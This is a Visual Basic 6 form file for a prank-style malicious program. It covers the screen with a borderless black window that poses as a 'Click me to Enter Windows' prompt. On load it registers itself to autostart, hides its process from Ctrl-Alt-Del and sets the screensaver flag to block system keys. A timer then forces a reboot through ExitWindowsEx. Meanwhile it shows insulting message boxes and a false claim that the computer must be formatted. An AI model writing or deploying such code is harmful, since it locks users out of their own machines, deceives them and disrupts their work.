VERSION 5.00
Begin VB.Form main 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   11520
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   15360
   Icon            =   "frmnice.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   11520
   ScaleWidth      =   15360
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   800
      Left            =   1800
      Top             =   6480
   End
   Begin VB.Timer Timer1 
      Interval        =   250
      Left            =   720
      Top             =   6480
   End
   Begin VB.Label Label2 
      BackColor       =   &H00000000&
      Caption         =   "stop"
      BeginProperty Font 
         Name            =   "Garamond"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   135
      Left            =   14520
      TabIndex        =   2
      Top             =   10920
      Width           =   855
   End
   Begin VB.Label lblcl 
      BackStyle       =   0  'Transparent
      Caption         =   "Click me to Enter Windows............."
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   6000
      TabIndex        =   1
      Top             =   5160
      Width           =   2775
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "E&xit"
      BeginProperty Font 
         Name            =   "Haettenschweiler"
         Size            =   8.25
         Charset         =   0
         Weight          =   500
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   10200
      TabIndex        =   0
      Top             =   11400
      Width           =   615
   End
End
Attribute VB_Name = "main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
 Dim ctr As Integer
Private Declare Function RegisterServiceProcess Lib "kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32.dll" () As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Const EWX_FORCE = 4
Private Const EWX_LOGOFF = 0
Private Const EWX_REBOOT = 2
Private Const EWX_SHUTDOWN = 1

Const SPI_SCREENSAVERRUNNING = 97

Private Declare Function SystemParametersInfo Lib "user32" _
    Alias "SystemParametersInfoA" (ByVal uAction As Long, _
    ByVal uParam As Long, ByVal lpvParam As Any, _
    ByVal fuWinIni As Long) As Long

Public Sub reb()
Call ExitWindowsEx(EWX_REBOOT, 2)
End Sub


Private Sub DisableCtrlAltDel()

RegisterServiceProcess GetCurrentProcessId, 1

End Sub


Private Sub Form_KeyPress(KeyAscii As Integer)
If KeyAscii = "13" Or KeyAscii = "27" Then
MsgBox "Sorry you need to format your computer now!!!!!!!!!!!!!!!!!!!"
MsgBox "HA! HA! HA! HA! HA! HA! HA! HA! "
End If
End Sub

Private Sub Form_Load()
Call AppAutoStart
Call DisableCtrlAltDel
        
    Call SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, "1", 0)
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label1.ForeColor = vbBlack
Label2.ForeColor = vbBlack
End Sub

Private Sub Label1_Click()
Call SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, "1", 0)
End
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label1.ForeColor = vbWhite
End Sub

Private Sub Label2_Click()
Call AppAutoStop

End Sub

Private Sub Label2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label2.ForeColor = vbWhite
End Sub

Private Sub lblcl_Click()

ctr = ctr + 1
If ctr = 3 Then
MsgBox "Fuck of !!!!!!!!!!!!!!"
ctr = 0
Else
MsgBox "ASS HOLE !!!!!!!!!!"
End If
End Sub

Private Sub Timer1_Timer()
If lblcl.Visible = True Then
lblcl.Visible = False
Else
lblcl.Visible = True
End If

End Sub

Private Sub Timer2_Timer()
ctr = ctr + 1
If ctr = 8 Then
Call reb

End If
End Sub
